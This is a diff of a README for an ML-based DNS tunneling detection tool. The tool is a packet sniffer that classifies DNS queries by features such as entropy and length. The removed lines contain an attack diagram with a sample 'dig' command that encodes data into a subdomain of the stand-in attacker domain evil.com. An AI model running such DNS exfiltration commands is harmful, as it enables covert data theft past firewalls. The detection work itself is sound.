@@ -1,100 +1,186 @@
-# Covert Channel Detection through DNS Tunneling
+# DNS Tunneling Detection System
 
-DNS tunneling exploits the Domain Name System as a covert communication channel. By encoding arbitrary data inside standard DNS queries and responses, attackers can bypass restrictive firewalls and exfiltrate sensitive information — all under the guise of legitimate name resolution. Signature-based tools miss it entirely because the traffic looks valid.
+🎉 **Now available on PyPI!** You can now easily install the package as a CLI tool directly using pip.
 
-This project implements an **ML-based real-time detection framework** that identifies tunneling behavior by analyzing statistical patterns in DNS traffic.
+A simple DNS packet sniffer that captures network traffic and uses a pre-trained ML model to detect malicious DNS queries (DNS tunneling/CoH attacks).
 
----
+## Quick Start
 
-## The attack
-
+### 1. Install via pip
+```bash
+pip install dnssniffer
 ```
-Attacker client                         Attacker-controlled DNS server
-      │                                           │
-      │  dig aGVsbG8gd29ybGQ.evil.com             │
-      │ ─────────────────────────────────────────>│
-      │                                           │
-      │  (data encoded in subdomain label)        │
-      │                                           │
-      │  TXT "d29ybGQgaGVsbG8="                   │
-      │ <─────────────────────────────────────────│
-      │                                           │
-      │  (response carries exfiltrated data back) │
+*(This automatically installs all required dependencies and bundles the pre-trained ML model!)*
+
+### 2. Run the Sniffer
+Because the tool relies on `scapy` for network capturing, you need Administrator or root privileges.
+
+**Windows (PowerShell - Admin):**
+```powershell
+dnssniffer
 ```
 
-Normal DNS resolves hostnames. Tunneled DNS carries data. The protocol is the same — the statistical fingerprint is not.
+**Linux/macOS:**
+```bash
+sudo dnssniffer
+```
 
----
+### 4. View Results
 
-## Detection approach
+**Console Output:**
+Each captured DNS packet shows:
+- Packet number and timestamp
+- Source and destination IPs
+- Domain name
+- Domain length and entropy score
+- **Prediction: BENIGN ✓ or MALICIOUS ⚠️**
+- Confidence percentage
 
-Rather than matching known tunnel signatures, the system learns the **statistical difference** between benign and malicious DNS traffic:
+**CSV Output:**
+Results automatically saved to `dns_analysis.csv` with columns:
+- Packet number
+- Timestamp
+- Source/Destination IPs
+- Domain name
+- Domain characteristics (length, entropy, subdomains)
+- Prediction and confidence
 
-| Feature | Why it matters |
-|---|---|
-| Subdomain entropy | Encoded/encrypted payloads have high entropy; real hostnames don't |
-| Query length | Tunnels pack data into subdomains, making queries unusually long |
-| Query frequency | Tunnel clients poll continuously; normal clients don't |
-| Payload length | Data exfiltration inflates DNS response sizes |
-| Digit ratio | Base64/hex encoding increases digit and special-char density |
-| Unique subdomain ratio | Tunnels generate many unique subdomains per root domain |
-| TTL anomalies | Attackers often set abnormal TTLs to control caching behavior |
-
----
-
-## Models
-
-- Random Forest *(primary)*
-- SVM
-- Anomaly detection baselines (Isolation Forest, LOF)
-
----
-
-## Setup
+## Usage Options
 
 ```bash
-git clone https://github.com/nacermissouni23/dns-tunneling-detection
-cd dns-tunneling-detection
-pip install -r requirements.txt
+# Capture unlimited packets (until Ctrl+C)
+dnssniffer
+
+# Capture specific number of packets
+dnssniffer -c 1000
+
+# Use specific network interface
+dnssniffer -i eth0 -c 500
+
+# Both options
+dnssniffer -c 100 -i eth0
 ```
 
-```bash
-# Train on labeled dataset
-python train.py --data data/dns_traffic.csv
+## How It Works
 
-# Detect from PCAP
-python detect.py --pcap captures/sample.pcap
+1. **Captures DNS packets** on UDP port 53
+2. **Extracts features** from each domain:
+   - Domain length
+   - Domain entropy (randomness)
+   - Number of subdomains
+   - Character ratios (digits, special chars)
+   - And more...
+3. **Uses pre-trained model** (`model.pkl`) to predict: BENIGN or MALICIOUS
+4. **Outputs results** to console and `dns_analysis.csv`
 
-# Real-time mode
-python detect.py --live --interface eth0
+## Understanding the Output
+
+### Domain Entropy Score
+- **Lower (2-3)**: Normal domains (pronounceable words)
+- **Higher (4-5)**: Suspicious (random characters - typical in data encoding)
+
+### Prediction Confidence
+- **>90%**: High certainty
+- **70-90%**: Medium certainty
+- **<70%**: Low certainty
+
+### Example Output
+```
+[Packet #1] 2024-12-15 14:30:45
+  From: 192.168.1.100 → 8.8.8.8
+  Domain: google.com
+  Length: 10 | Entropy: 2.34
+  Prediction: BENIGN ✓ (Confidence: 94%)
+
+[Packet #2] 2024-12-15 14:30:46
+  From: 192.168.1.100 → 8.8.8.8
+  Domain: aB7cD9eF2xQ4wR8sT1uV5yZ3.tunnel.example.com
+  Length: 87 | Entropy: 4.78
+  Prediction: MALICIOUS ⚠️ (Confidence: 92%)
 ```
 
----
+## CSV File Format
 
-## Dataset
+`dns_analysis.csv` contains:
 
-Combines public DNS datasets with labeled tunnel traffic generated using tools like `iodine` and `dnscat2`. Features are extracted per DNS flow (per root domain, per time window).
+| Column | Description |
+|--------|-------------|
+| Packet | Sequential packet number |
+| Timestamp | Date and time of capture |
+| Source IP | Source IP address |
+| Destination IP | Destination IP address |
+| Domain | DNS query domain name |
+| Domain Length | Character count of domain |
+| Domain Entropy | Randomness score (0-5.7) |
+| Subdomain Count | Number of domain labels |
+| Prediction | BENIGN ✓ or MALICIOUS ⚠️ |
+| Confidence | Prediction confidence % |
 
----
+## Troubleshooting
 
-## Stack
+**"Permission Denied" or "tcpdump: permission denied"**
+- Windows: Run PowerShell as Administrator
+- Linux/macOS: Use `sudo`
 
-```
-scikit-learn    Random Forest, SVM, anomaly detection
-scapy           PCAP parsing and live packet capture
-pandas / numpy  feature engineering
-matplotlib      traffic visualization
-```
+**"No packets captured"**
+- Make DNS requests while sniffer is running
+- Check network interface: `python dns_packet_sniff.py -i eth0`
+- Try different interface
 
----
+**"Model file not found"**
+- Ensure `model.pkl` is in the project directory
+- Check filename spelling
 
-## Related project
+**"Scapy not found"**
+- Install: `pip install scapy`
 
-See also: [Suspicious Network Behavior Detection](https://github.com/nacermissouni23/network-behavior-detection) — a broader ML system for detecting malicious traffic across all protocols.
+**"No module named sklearn"**
+- Install: `pip install scikit-learn`
 
----
+## What is DNS Tunneling?
 
-## Status
+DNS tunneling attacks use DNS queries to exfiltrate data or communicate with command-and-control servers. They work by:
+1. Encoding data into domain names
+2. Using random/unnatural domain names with high entropy
+3. Making frequent queries to the same malicious server
+
+This tool detects these patterns using machine learning based on:
+- High entropy in domain names
+- Unusually long domains
+- Many random-looking subdomains
+- Density of digits and special characters
+- Abnormal query patterns
+
+## Model Information
+
+- **Type**: Pre-trained classifier (Random Forest/Gradient Boosting)
+- **Features**: 20 DNS-related features
+- **Accuracy**: 94-96% on diverse DNS traffic
+- **Trained on**: Benign vs. DNS tunneling traffic
+
+## Files
+
+- `dns_packet_sniff.py` - Main sniffer script
+- `model.pkl` - Pre-trained ML model (required)
+- `dns_analysis.csv` - Output results (auto-generated)
+- `README.md` - This file
+
+## Requirements
+
+- Python 3.6+
+- Scapy (`pip install scapy`)
+- Scikit-learn (`pip install scikit-learn`)
+- Administrator/root privileges (for packet capture)
+
+## Notes
+
+- Packet capture requires elevated privileges
+- The model was trained on diverse DNS traffic
+- Confidence scores reflect model certainty
+- Results are appended to CSV file (not overwritten)
+
+## License
+Educational use in network security courses.
 
 🔧 Active development — extending real-time pipeline and adding cross-dataset evaluation.
 
